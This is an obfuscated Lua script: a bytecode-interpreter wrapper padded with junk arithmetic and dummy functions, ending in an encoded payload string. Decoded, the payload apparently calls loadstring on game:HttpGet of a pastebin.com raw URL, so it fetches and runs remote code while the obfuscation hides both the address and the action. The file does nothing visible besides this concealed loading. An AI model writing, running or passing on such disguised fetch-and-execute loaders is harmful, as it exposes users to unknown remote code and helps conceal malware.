

local v0 = tonumber;
local v1 = string.byte;
local v2 = string.char;
local v3 = string.sub;
local v4 = string.gsub;
local v5 = string.rep;
local v6 = table.concat;
local v7 = table.insert;
local v8 = math.ldexp;
local v9 = getfenv or function()
	return _ENV;
end;
local v10 = setmetatable;
local v11 = pcall;
local v12 = select;
local v13 = unpack or table.unpack;
local v14 = tonumber;
local function v15(v16, v17, ...)
	local v18 = 1;
	local v19;
	v16 = v4(v3(v16, 5), "..", function(v30)
		if (v1(v30, 2) == 81) then
			v19 = v0(v3(v30, 1, 1));
			return "";
		else
			local v81 = 0;
			local v82;
			while true do
				if (v81 == 0) then
					v82 = v2(v0(v30, 16));
					if v19 then
						local v110 = v5(v82, v19);
						v19 = nil;
						return v110;
					else
						return v82;
					end
					break;
				end
			end
		end
	end);
	local function v20(v31, v32, v33)
		if v33 then
			local v83 = 0 - 0;
			local v84;
			while true do
				if (v83 == (0 - 0)) then
					v84 = (v31 / ((3 - 1) ^ (v32 - (2 - 1)))) % (2 ^ (((v33 - ((883 - 263) - (555 + 64))) - (v32 - (932 - (857 + 74)))) + (569 - (367 + 201))));
					return v84 - (v84 % (928 - (214 + 713)));
				end
			end
		else
			local v85 = 0 + 0;
			local v86;
			while true do
				if (v85 == 0) then
					v86 = (1 + (1066 - (68 + 997))) ^ (v32 - (878 - ((1552 - (226 + 1044)) + 595)));
					return (((v31 % (v86 + v86)) >= v86) and (1638 - (1523 + 114))) or (0 + 0);
				end
			end
		end
	end
	local function v21()
		local v34 = 0 - 0;
		local v35;
		while true do
			if ((118 - (32 + 85)) == v34) then
				return v35;
			end
			if (v34 == ((0 - 0) + 0)) then
				v35 = v1(v16, v18, v18);
				v18 = v18 + 1 + 0;
				v34 = 958 - (892 + 65);
			end
		end
	end
	local function v22()
		local v36 = 0;
		local v37;
		local v38;
		while true do
			if (v36 == (1 - 0)) then
				return (v38 * (469 - 213)) + v37;
			end
			if (v36 == 0) then
				v37, v38 = v1(v16, v18, v18 + ((863 - 511) - (87 + 263)));
				v18 = v18 + (182 - (67 + 113));
				v36 = 1 + 0;
			end
		end
	end
	local function v23()
		local v39, v40, v41, v42 = v1(v16, v18, v18 + 3 + 0);
		v18 = v18 + (15 - 11);
		return (v42 * (16778168 - (802 + 150))) + (v41 * 65536) + (v40 * 256) + v39;
	end
	local function v24()
		local v43 = 0 - 0;
		local v44;
		local v45;
		local v46;
		local v47;
		local v48;
		local v49;
		while true do
			if (v43 == (2 - 1)) then
				v46 = 1 - 0;
				v47 = (v20(v45, 1 + 0, 20) * ((999 - (915 + (291 - 209))) ^ (90 - 58))) + v44;
				v43 = 2 + 0;
			end
			if ((0 - (859 - (814 + 45))) == v43) then
				v44 = v23();
				v45 = v23();
				v43 = 1188 - (1069 + 118);
			end
			if (v43 == ((9 - 5) - 2)) then
				v48 = v20(v45, 45 - 24, 6 + 2 + 23);
				v49 = ((v20(v45, 56 - 24) == (1 + 0)) and -(792 - (368 + 423))) or (3 - 2);
				v43 = 21 - (10 + 8);
			end
			if (v43 == (11 - 8)) then
				if (v48 == (442 - (416 + 26))) then
					if (v47 == (0 - 0)) then
						return v49 * (0 + 0);
					else
						local v111 = 0 - 0;
						while true do
							if (v111 == (438 - (145 + 293))) then
								v48 = 431 - (44 + 386);
								v46 = 1486 - (998 + 173 + 315);
								break;
							end
						end
					end
				elseif (v48 == (651 + 1396)) then
					return ((v47 == (0 + 0)) and (v49 * (((1658 - (261 + 624)) - (201 + 571)) / 0))) or (v49 * NaN);
				end
				return v8(v49, v48 - (2161 - (116 + (1815 - 793)))) * (v46 + (v47 / (((1088 - (1020 + 60)) - 6) ^ (31 + 21))));
			end
		end
	end
	local function v25(v50)
		local v51 = 1423 - (630 + 793);
		local v52;
		local v53;
		while true do
			if (v51 == (0 - (0 - 0))) then
				v52 = nil;
				if not v50 then
					v50 = v23();
					if (v50 == (0 - 0)) then
						return "";
					end
				end
				v51 = 1 + 0;
			end
			if (v51 == (9 - 6)) then
				return v6(v53);
			end
			if (v51 == 2) then
				v53 = {};
				for v93 = 1748 - (760 + 987), #v52 do
					v53[v93] = v2(v1(v3(v52, v93, v93)));
				end
				v51 = 1916 - (1789 + 124);
			end
			if (v51 == (767 - (745 + 21))) then
				v52 = v3(v16, v18, (v18 + v50) - (1 + 0 + 0));
				v18 = v18 + v50;
				v51 = 5 - 3;
			end
		end
	end
	local v26 = v23;
	local function v27(...)
		return {...}, v12("#", ...);
	end
	local function v28()
		local v54 = (function()
			return 0;
		end)();
		local v55 = (function()
			return;
		end)();
		local v56 = (function()
			return;
		end)();
		local v57 = (function()
			return;
		end)();
		local v58 = (function()
			return;
		end)();
		local v59 = (function()
			return;
		end)();
		local v60 = (function()
			return;
		end)();
		while true do
			if (v54 ~= #" ") then
			else
				local v89 = (function()
					return 0;
				end)();
				local v90 = (function()
					return;
				end)();
				while true do
					if (v89 == (0 - 0)) then
						v90 = (function()
							return 0;
						end)();
						while true do
							if (v90 ~= (1 - 0)) then
							else
								for v116 = #"!", v59 do
									local v117 = (function()
										return 0;
									end)();
									local v118 = (function()
										return;
									end)();
									local v119 = (function()
										return;
									end)();
									local v120 = (function()
										return;
									end)();
									while true do
										if (v117 == 0) then
											v118 = (function()
												return 0 - 0;
											end)();
											v119 = (function()
												return nil;
											end)();
											v117 = (function()
												return 1825 - (1195 + 629);
											end)();
										end
										if (v117 ~= 1) then
										else
											v120 = (function()
												return nil;
											end)();
											while true do
												if (v118 == #":") then
													if (v119 == #"<") then
														v120 = (function()
															return v21() ~= (0 - 0);
														end)();
													elseif (v119 == 2) then
														v120 = (function()
															return v24();
														end)();
													elseif (v119 == #"nil") then
														v120 = (function()
															return v25();
														end)();
													end
													v60[v116] = (function()
														return v120;
													end)();
													break;
												end
												if (v118 ~= 0) then
												else
													local v166 = (function()
														return 241 - (187 + 54);
													end)();
													while true do
														if ((781 - (162 + 618)) ~= v166) then
														else
															v118 = (function()
																return #"]";
															end)();
															break;
														end
														if (v166 == 0) then
															v119 = (function()
																return v21();
															end)();
															v120 = (function()
																return nil;
															end)();
															v166 = (function()
																return 1;
															end)();
														end
													end
												end
											end
											break;
										end
									end
								end
								v58[#"91("] = (function()
									return v21();
								end)();
								v90 = (function()
									return 2;
								end)();
							end
							if (v90 == 2) then
								v54 = (function()
									return 2 + 0;
								end)();
								break;
							end
							if (v90 == 0) then
								v59 = (function()
									return v23();
								end)();
								v60 = (function()
									return {};
								end)();
								v90 = (function()
									return 1;
								end)();
							end
						end
						break;
					end
				end
			end
			if (v54 == (2 + 0)) then
				for v95 = #"{", v23() do
					local v96 = (function()
						return v21();
					end)();
					if (v20(v96, #"{", #",") == (0 - 0)) then
						local v105 = (function()
							return 0 - 0;
						end)();
						local v106 = (function()
							return;
						end)();
						local v107 = (function()
							return;
						end)();
						local v108 = (function()
							return;
						end)();
						local v109 = (function()
							return;
						end)();
						while true do
							if ((1 + 0) ~= v105) then
							else
								local v113 = (function()
									return 1636 - (1373 + 263);
								end)();
								local v114 = (function()
									return;
								end)();
								while true do
									if (v113 == 0) then
										v114 = (function()
											return 0;
										end)();
										while true do
											if (1 ~= v114) then
											else
												v105 = (function()
													return 1002 - (451 + 549);
												end)();
												break;
											end
											if (v114 == (0 + 0)) then
												v108 = (function()
													return nil;
												end)();
												v109 = (function()
													return nil;
												end)();
												v114 = (function()
													return 1;
												end)();
											end
										end
										break;
									end
								end
							end
							if (v105 == (2 - 0)) then
								while true do
									if (v106 ~= 0) then
									else
										local v121 = (function()
											return 0 - 0;
										end)();
										while true do
											if (v121 == (1385 - (746 + 638))) then
												v106 = (function()
													return #">";
												end)();
												break;
											end
											if ((0 + 0) == v121) then
												v107 = (function()
													return v20(v96, 2 - 0, #"nil");
												end)();
												v108 = (function()
													return v20(v96, #"0313", 347 - (218 + 123));
												end)();
												v121 = (function()
													return 1582 - (1535 + 46);
												end)();
											end
										end
									end
									if (v106 == #"asd") then
										if (v20(v108, #"xxx", #"nil") == #"[") then
											v109[#".dev"] = (function()
												return v60[v109[#"0836"]];
											end)();
										end
										v55[v95] = (function()
											return v109;
										end)();
										break;
									end
									if (v106 == 2) then
										local v123 = (function()
											return 0;
										end)();
										local v124 = (function()
											return;
										end)();
										while true do
											if ((0 + 0) == v123) then
												v124 = (function()
													return 0;
												end)();
												while true do
													if (v124 == (1 + 0)) then
														v106 = (function()
															return #"gha";
														end)();
														break;
													end
													if (v124 ~= 0) then
													else
														if (v20(v108, #"~", #"~") == #"{") then
															v109[562 - (306 + 254)] = (function()
																return v60[v109[1 + 1]];
															end)();
														end
														if (v20(v108, 3 - 1, 1469 - (899 + 568)) ~= #"/") then
														else
															v109[#"-19"] = (function()
																return v60[v109[#"-19"]];
															end)();
														end
														v124 = (function()
															return 1 + 0;
														end)();
													end
												end
												break;
											end
										end
									end
									if (v106 ~= #" ") then
									else
										local v125 = (function()
											return 0 - 0;
										end)();
										local v126 = (function()
											return;
										end)();
										while true do
											if (v125 ~= (603 - (268 + 335))) then
											else
												v126 = (function()
													return 290 - (60 + 230);
												end)();
												while true do
													if ((573 - (426 + 146)) ~= v126) then
													else
														v106 = (function()
															return 1 + 1;
														end)();
														break;
													end
													if (0 == v126) then
														v109 = (function()
															return {v22(),v22(),nil,nil};
														end)();
														if (v107 == (811 - (569 + 242))) then
															local v171 = (function()
																return 0;
															end)();
															local v172 = (function()
																return;
															end)();
															while true do
																if (v171 ~= 0) then
																else
																	v172 = (function()
																		return 0 - 0;
																	end)();
																	while true do
																		if (v172 == (0 + 0)) then
																			v109[#"19("] = (function()
																				return v22();
																			end)();
																			v109[#"http"] = (function()
																				return v22();
																			end)();
																			break;
																		end
																	end
																	break;
																end
															end
														elseif (v107 == #"}") then
															v109[#"xnx"] = (function()
																return v23();
															end)();
														elseif (v107 == 2) then
															v109[#"91("] = (function()
																return v23() - ((1026 - (706 + 318)) ^ (1267 - (721 + 530)));
															end)();
														elseif (v107 == #"91(") then
															local v177 = (function()
																return 0;
															end)();
															local v178 = (function()
																return;
															end)();
															while true do
																if (v177 == 0) then
																	v178 = (function()
																		return 0;
																	end)();
																	while true do
																		if (v178 ~= (1271 - (945 + 326))) then
																		else
																			v109[#"asd"] = (function()
																				return v23() - ((4 - 2) ^ (15 + 1));
																			end)();
																			v109[#"asd1"] = (function()
																				return v22();
																			end)();
																			break;
																		end
																	end
																	break;
																end
															end
														end
														v126 = (function()
															return 701 - (271 + 429);
														end)();
													end
												end
												break;
											end
										end
									end
								end
								break;
							end
							if (v105 ~= (0 + 0)) then
							else
								local v115 = (function()
									return 1500 - (1408 + 92);
								end)();
								while true do
									if (v115 == (1086 - (461 + 625))) then
										v106 = (function()
											return 1288 - (993 + 295);
										end)();
										v107 = (function()
											return nil;
										end)();
										v115 = (function()
											return 1;
										end)();
									end
									if (v115 == 1) then
										v105 = (function()
											return 1;
										end)();
										break;
									end
								end
							end
						end
					end
				end
				for v97 = #"}", v23() do
					v56[v97 - #"."] = (function()
						return v28();
					end)();
				end
				return v58;
			end
			if (v54 ~= 0) then
			else
				local v91 = (function()
					return 0 + 0;
				end)();
				local v92 = (function()
					return;
				end)();
				while true do
					if (v91 ~= (1171 - (418 + 753))) then
					else
						v92 = (function()
							return 0;
						end)();
						while true do
							if (v92 ~= (0 + 0)) then
							else
								v55 = (function()
									return {};
								end)();
								v56 = (function()
									return {};
								end)();
								v92 = (function()
									return 1;
								end)();
							end
							if (v92 == 1) then
								v57 = (function()
									return {};
								end)();
								v58 = (function()
									return {v55,v56,nil,v57};
								end)();
								v92 = (function()
									return 2;
								end)();
							end
							if (v92 == 2) then
								v54 = (function()
									return #"/";
								end)();
								break;
							end
						end
						break;
					end
				end
			end
		end
	end
	local function v29(v61, v62, v63)
		local v64 = v61[1 + 0];
		local v65 = v61[1 + 1];
		local v66 = v61[1 + 2];
		return function(...)
			local v67 = v64;
			local v68 = v65;
			local v69 = v66;
			local v70 = v27;
			local v71 = 1 + 0 + 0;
			local v72 = -(1 + 0);
			local v73 = {};
			local v74 = {...};
			local v75 = v12("#", ...) - (530 - (406 + 123));
			local v76 = {};
			local v77 = {};
			for v87 = 0 + 0, v75 do
				if (((4853 >= 2982) and (v87 >= v69)) or (2408 < 2109)) then
					v73[v87 - v69] = v74[v87 + (2 - 1)];
				else
					v77[v87] = v74[v87 + (1770 - (1749 + 20))];
				end
			end
			local v78 = (v75 - v69) + 1 + 0;
			local v79;
			local v80;
			while true do
				local v88 = 1322 - (1249 + 73);
				while true do
					if ((4134 > 3357) and (v88 == (3 - 2))) then
						if ((v80 <= (1128 - (118 + 1003))) or (3417 < 2534)) then
							if (v80 <= (2 + 1)) then
								if (v80 <= (1146 - (466 + 679))) then
									if ((v80 == (0 - 0)) or (33 == 1455)) then
										local v127 = v79[2];
										v77[v127] = v77[v127](v13(v77, v127 + (2 - 1), v72));
									else
										do
											return;
										end
									end
								elseif (v80 == ((3877 - (1913 + 62)) - (106 + 1794))) then
									local v129 = v79[1 + 1];
									local v130 = v77[v79[5 - 2]];
									v77[v129 + 1 + 0] = v130;
									v77[v129] = v130[v79[11 - 7]];
								else
									v77[v79[5 - 3]]();
								end
							elseif (v80 <= (119 - (4 + 110))) then
								if (v80 > (588 - (57 + 527))) then
									local v134 = v79[1 + 0 + 1];
									local v135, v136 = v70(v77[v134](v13(v77, v134 + (1428 - (41 + 1386)), v79[6 - 3])));
									v72 = (v136 + v134) - ((5 - 3) - 1);
									local v137 = (1933 - (565 + 1368)) - 0;
									for v160 = v134, v72 do
										v137 = v137 + ((391 - 287) - (17 + 86));
										v77[v160] = v135[v137];
									end
								else
									local v138 = v79[(1663 - (1477 + 184)) + 0];
									local v139, v140 = v70(v77[v138](v13(v77, v138 + (754 - (239 + 514)), v79[6 - 3])));
									v72 = (v140 + v138) - (2 - 1);
									local v141 = (225 - 59) - (122 + 44);
									for v163 = v138, v72 do
										local v164 = 0 - 0;
										while true do
											if ((v164 == (0 - 0)) or (443 >= 4015)) then
												v141 = v141 + 1 + 0;
												v77[v163] = v139[v141];
												break;
											end
										end
									end
								end
							elseif (v80 == (1 + 5)) then
								v77[v79[3 - 1]] = {};
							else
								do
									return;
								end
							end
						elseif (v80 <= (76 - (28 + 2 + (891 - (564 + 292))))) then
							if (v80 <= (20 - 11)) then
								if (v80 == (6 + 2)) then
									v77[v79[1259 - ((1798 - 755) + 214)]] = v63[v79[11 - (23 - 15)]];
								else
									v77[v79[2]] = {};
								end
							elseif ((3382 > 166) and (v80 > (1222 - (323 + 889)))) then
								v77[v79[2 + 0]]();
							else
								v77[v79[5 - (307 - (244 + 60))]] = v79[5 - 2];
							end
						elseif ((v80 <= (593 - (278 + 83 + 219))) or (280 == 3059)) then
							if (v80 > ((808 - (41 + 435)) - (53 + 267))) then
								v77[v79[1 + 1]] = v63[v79[(1417 - (938 + 63)) - (15 + 398)]];
							else
								v77[v79[2]] = v79[3];
							end
						elseif ((v80 == (996 - (18 + 964))) or (2722 <= 164)) then
							local v152 = v79[7 - 5];
							v77[v152] = v77[v152](v13(v77, v152 + (217 - (42 + 174)), v72));
						else
							local v154 = v79[2 + 0];
							local v155 = v77[v79[3 + 0]];
							v77[v154 + 1 + 0 + 0] = v155;
							v77[v154] = v155[v79[854 - (20 + (1955 - (936 + 189)))]];
						end
						v71 = v71 + 1;
						break;
					end
					if (v88 == (0 + 0)) then
						v79 = v67[v71];
						v80 = v79[127 - (116 + 10)];
						v88 = 1 + 0;
					end
				end
			end
		end;
	end
	return v29(v28(), {}, v17)(...);
end
return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403213Q00682Q7470733A2Q2F706173746562696E2E636F6D2F7261772F4648386D3832724700094Q00067Q001208000100013Q001208000200023Q00200200020002000300120C000400044Q0004000200044Q000E00013Q00022Q000B0001000100012Q00013Q00017Q00", v9(), ...);
